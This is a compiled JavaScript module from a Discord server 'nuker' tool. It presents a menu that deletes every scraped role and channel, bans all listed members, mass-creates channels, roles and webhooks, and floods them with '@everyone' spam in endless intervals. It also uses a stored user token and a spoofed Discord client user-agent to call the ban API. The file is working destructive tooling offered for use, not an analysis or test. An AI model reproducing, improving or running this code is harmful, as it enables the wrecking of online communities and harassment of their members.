"use strict";
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
exports.wizz = void 0;
const scrape_1 = __importDefault(require("../models/scrape"));
const chalk_1 = require("chalk");
const templates_1 = __importDefault(require("../models/templates"));
const createString_1 = require("../utils/createString");
const getTheme_1 = require("../utils/getTheme");
const logo_1 = require("../utils/logo");
const main_1 = require("./main");
const wizzOptions_1 = __importDefault(require("../utils/wizzOptions"));
const requests = require("request");
const setting_scrape_delnuke_1 = __importDefault(require("../models/setting-scrape-delnuke"));
const scrape_2 = require("./scrape");
const rapidTitlePromise_1 = require("./rapidTitlePromise");
function BanUser(guild, memberid, db, reason = null) {
    return __awaiter(this, void 0, void 0, function* () {
        const ops = {
            url: `https://discord.com/api/v8/guilds/${guild}/bans/${memberid}`,
            headers: {
                Authorization: `${db.get("curtoken")}`,
                "content-type": "application/json",
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.309 Chrome/83.0.4103.122 Electron/9.3.5 Safari/537.36",
            },
            json: {
                reason: `${reason}`,
            },
        };
        let mainColor = getTheme_1.getTheme(db);
        requests.put(ops.url, (error, response, data) => {
            if (error) {
                console.log(error);
            }
            else if (response.statusCode == 429) {
            }
            else if (response.statusCode == 204) {
                console.log(createString_1.createString(`Successfully banned ${mainColor(memberid)}`, db, "semi"));
            }
            else if (response.statusCode == 200) {
                console.log(createString_1.createString(`Successfully banned ${mainColor(memberid)}`, db, "semi"));
            }
            else if (response.statusCode == 201) {
                console.log(createString_1.createString(`Successfully banned ${mainColor(memberid)}`, db, "semi"));
            }
        });
    });
}
function mainWizz(client, db, rl, guildID, channelName, channelAmount, roleName, roleAmount, webhookName) {
    return __awaiter(this, void 0, void 0, function* () {
        function nukeStr(str, type) {
            let r = `${mainColor("[")}${chalk_1.white(type === "rateLimit"
                ? "!"
                : type === "success"
                    ? "+"
                    : type === "fail"
                        ? "-"
                        : "")}${mainColor("]")} ${chalk_1.white(str)}`;
            return r;
        }
        let mainColor = getTheme_1.getTheme(db);
        if (!client.guilds.cache.has(guildID)) {
            console.log(createString_1.createString("Unknown server", db, "semi", "fail"));
            setTimeout(() => {
                main_1.main(db, rl, client);
            }, 1000);
            return;
        }
        let D = yield scrape_1.default.findOne({
            Username: db.get("username"),
            Guild: guildID,
        });
        let data = D;
        if (!data) {
            console.log(" ");
            console.log(createString_1.createString("There is no scrape data for the server", db, "semi", "fail"));
            setTimeout(() => {
                main_1.main(db, rl, client);
            }, 2000);
            return;
        }
        let server = client.guilds.cache.get(guildID);
        // console.log(server)
        // if (
        //   !server.me.hasPermissions([
        //     "BAN_MEMBERS",
        //     "MANAGE_CHANNELS",
        //     "MANAGE_ROLES",
        //   ])
        // ) {
        //   process.title = "[External-Nuker] - Missing permissions";
        //   console.log(createString("Failed to find required permissions", db));
        //   console.log(" ");
        //   rl.question(createString("Type anything to continue", db), () => {
        //     main(db, rl, client);
        //   });
        //   return;
        // }
        process.title = `[External-Nuker] - Nuking ${server.name}`;
        let rolesArr = data.Roles;
        client.on("rateLimit", () => {
            console.log(nukeStr("Rate limited sleeping", "rateLimit"));
        });
        rolesArr.map((roleID) => __awaiter(this, void 0, void 0, function* () {
            let role = server.roles.cache.get(roleID);
            role
                .delete()
                .then((r) => {
                console.log(nukeStr(`Deleted role ${r.id}`, "success"));
            })
                .catch(() => {
                console.log(nukeStr(`Failed to delete role ${roleID}`, "fail"));
            });
        }));
        let hasSettingScrapeNuke = setting_scrape_delnuke_1.default.findOne({
            Username: db.get("username"),
        });
        if (hasSettingScrapeNuke) {
            scrape_1.default
                .deleteOne({ Username: db.get("username"), Guild: guildID })
                .exec();
        }
        let channelArr = data.Channels;
        channelArr.map((channelID) => __awaiter(this, void 0, void 0, function* () {
            let channel = server.channels.cache.get(channelID);
            (yield channel.fetch())
                .delete()
                .then((r) => {
                console.log(nukeStr(`Deleted channel ${r.id}`, "success"));
            })
                .catch(() => {
                console.log(nukeStr(`Failed to delete channel ${channelID}`, "fail"));
            });
        }));
        let membersArr = data.Members;
        membersArr.map((memID) => __awaiter(this, void 0, void 0, function* () {
            server.members
                .ban(memID)
                .then(() => {
                console.log(nukeStr(`Banned member ${memID}`, "success"));
            })
                .catch(() => {
                console.log(nukeStr(`Failed to ban member ${memID}`, "fail"));
            });
        }));
        // server.channels.cache.map((ch) => {
        //   ch.delete()
        //     .then((c) => {
        //       console.log(nukeStr(`Deleted channel ${c.id}`, "success"));
        //     })
        //     .catch(() => {
        //       console.log(
        //         nukeStr(`Failed to delete channel ${ch.id}`, "fail")
        //       );
        //     });
        // });
        for (let i = 0; i < Number(channelAmount); i++) {
            server.channels
                .create(channelName)
                .then((x) => {
                console.log(nukeStr(`Created channel ${x.id}`, "success"));
                x.createWebhook(webhookName)
                    .then((hook) => {
                    console.log(nukeStr(`Created webhook ${webhookName}`, "success"));
                    setInterval(() => {
                        hook
                            .send(`@everyone`)
                            .then((mm) => {
                            console.log(nukeStr(`Sent webhook webhook message ${mm.id}`, "success"));
                        })
                            .catch(() => {
                            console.log(nukeStr(`Failed to send webhook message`, "fail"));
                        });
                    });
                })
                    .catch(() => {
                    console.log(nukeStr("Failed to create webhook", "fail"));
                });
                setInterval(() => {
                    x.send(`@everyone`)
                        .then((m) => {
                        console.log(nukeStr(`Sent channel message ${m.id}`, "success"));
                    })
                        .catch(() => {
                        console.log(nukeStr("Failed to send channel message", "fail"));
                    });
                });
            })
                .catch(() => {
                console.log(nukeStr(`Failed to create channel`, "fail"));
            });
        }
        for (let i = 0; i < Number(roleAmount); i++) {
            server.roles
                .create({ data: { name: roleName, color: "RANDOM" } })
                .then((x) => {
                console.log(nukeStr(`Created role ${x.id}`, "success"));
            })
                .catch(() => {
                console.log(nukeStr(`Failed to create role`, "fail"));
            });
        }
    });
}
function checkConfigBefore(db, guildID) {
    let c = null;
    if (db.has(`settings.scrape.checknuke`)) {
        if (db.get(`settings.scrape.checknuke`) === true) {
            if (!db.has(`scrape_${guildID}`))
                c = "NONE";
        }
    }
    return c;
}
function wizz(client, db, rl) {
    return __awaiter(this, void 0, void 0, function* () {
        rapidTitlePromise_1.rapid("[External-Nuker] - Wizz", 1).then(() => {
            setTimeout(() => {
                process.title = "[External-Nuker] - Wizz";
            }, 40);
        });
        console.clear();
        wizzOptions_1.default(db);
        rl.question(createString_1.createString("Enter option", db), (option) => __awaiter(this, void 0, void 0, function* () {
            if (![
                "menu",
                "1",
                "2",
                "3",
                "4",
                "5",
                "6",
                "7",
                "8",
                "9",
                "x",
                "c",
                "v",
            ].includes(option)) {
                console.log(createString_1.createString("Unknown option", db, "semi", "fail"));
                setTimeout(() => {
                    wizz(client, db, rl);
                }, 1000);
                return;
            }
            if (option === "menu") {
                main_1.main(db, rl, client);
                return;
            }
            if (option === "9") {
                scrape_2.scrape(rl, db, client);
                return;
            }
            rl.question(createString_1.createString("Enter guild ID", db), (guildID) => __awaiter(this, void 0, void 0, function* () {
                if (guildID === "menu") {
                    main_1.main(db, rl, client);
                    return;
                }
                let x = client.guilds.cache.get(guildID);
                if (!x) {
                    process.title = "[External-Nuker] - Unknown server";
                    console.log(createString_1.createString("Unknown server", db, "semi", "fail"));
                    setTimeout(() => {
                        wizz(client, db, rl);
                    }, 2000);
                    return;
                }
                if (option === "menu") {
                    main_1.main(db, rl, client);
                    return;
                }
                client.on("rateLimit", () => __awaiter(this, void 0, void 0, function* () {
                    let mainColor = getTheme_1.getTheme(db);
                    console.log(mainColor("[") +
                        chalk_1.white("!") +
                        mainColor("] ") +
                        chalk_1.white("Rate limited.. Starting to sleep.."));
                }));
                let server = client.guilds.cache.get(guildID);
                if (option === "1") {
                    console.clear();
                    logo_1.logo(db);
                    let tems = yield templates_1.default.find({ Username: db.get("username") });
                    let arr = [];
                    tems.map((tem) => {
                        arr.push(tem.Name);
                    });
                    console.log(createString_1.createString("Templates:", db, "semi"));
                    console.log(arr.join("\n"));
                    console.log(" ");
                    rl.question(createString_1.createString("Enter template name", db), (name) => __awaiter(this, void 0, void 0, function* () {
                        if (name === "menu") {
                            main_1.main(db, rl, client);
                            return;
                        }
                        if (!arr.includes(name)) {
                            console.log(createString_1.createString("Invalid template", db, "semi", "fail"));
                            setTimeout(() => {
                                wizz(client, db, rl);
                            }, 2000);
                            return;
                        }
                        let data = yield templates_1.default.findOne({
                            Username: db.get("username"),
                            Name: name,
                        });
                        rl.question(createString_1.createString("Enter guild ID", db), (guildID) => {
                            let d = data;
                            mainWizz(client, db, rl, guildID, d.ChannelName, d.ChannelAmount, d.RoleName, d.RoleAmount, d.WebhookName);
                        });
                    }));
                }
                if (option === "2") {
                    if (!server.me.hasPermission("BAN_MEMBERS")) {
                        process.title = "[External-Nuker] - Missing ban permissions";
                        console.log(createString_1.createString("Failed to find needed permissions", db, "semi", "fail"));
                        setTimeout(() => {
                            wizz(client, db, rl);
                        }, 1000);
                        return;
                    }
                    require("./nuke/ban")(client, db, rl, guildID);
                }
                if (option === "3") {
                    if (!server.me.hasPermission("KICK_MEMBERS")) {
                        process.title = "[External-Nuker] - Missing kick permissions";
                        console.log(createString_1.createString("Failed to find needed permissions", db, "semi", "fail"));
                        setTimeout(() => {
                            wizz(client, db, rl);
                        }, 1000);
                        return;
                    }
                    require("./nuke/kick")(client, db, rl, guildID);
                }
                if (option === "4") {
                    if (!server.me.hasPermission("MANAGE_CHANNELS")) {
                        process.title =
                            "[External-Nuker] - Missing manage channel permissions";
                        console.log(createString_1.createString("Failed to find needed permissions", db, "semi", "fail"));
                        setTimeout(() => {
                            wizz(client, db, rl);
                        }, 1000);
                        return;
                    }
                    require("./nuke/createChannels")(client, db, rl, guildID);
                }
                if (option === "5") {
                    if (!server.me.hasPermission("MANAGE_CHANNELS")) {
                        process.title =
                            "[External-Nuker] - Missing manage channel permissions";
                        console.log(createString_1.createString("Failed to find needed permissions", db, "semi", "fail"));
                        setTimeout(() => {
                            wizz(client, db, rl);
                        }, 1000);
                        return;
                    }
                    require("./nuke/delChannels")(client, rl, db, guildID);
                }
                if (option === "6") {
                    if (!server.me.hasPermission("MANAGE_ROLES")) {
                        process.title = "[External-Nuker] - Missing manage role permissions";
                        console.log(createString_1.createString("Failed to find needed permissions", db, "semi", "fail"));
                        setTimeout(() => {
                            wizz(client, db, rl);
                        }, 1000);
                        return;
                    }
                    require("./nuke/createRoles")(client, db, rl, guildID);
                }
                if (option === "7") {
                    if (!server.me.hasPermission("MANAGE_ROLES")) {
                        process.title = "[External-Nuker] - Missing manage role permissions";
                        console.log(createString_1.createString("Failed to find needed permissions", db, "semi", "fail"));
                        setTimeout(() => {
                            wizz(client, db, rl);
                        }, 1000);
                        return;
                    }
                    require("./nuke/delRoles")(client, rl, db, guildID);
                }
                if (option === "8") {
                    require("./nuke/spamWebhooks")(client, rl, db, guildID);
                }
                if (option === "x" || option === "z" || option === "c") {
                    setTimeout(() => {
                        wizz(client, db, rl);
                    }, 1500);
                    console.log(createString_1.createString("Coming soon..", db, "semi", "fail"));
                }
            }));
        }));
    });
}
exports.wizz = wizz;
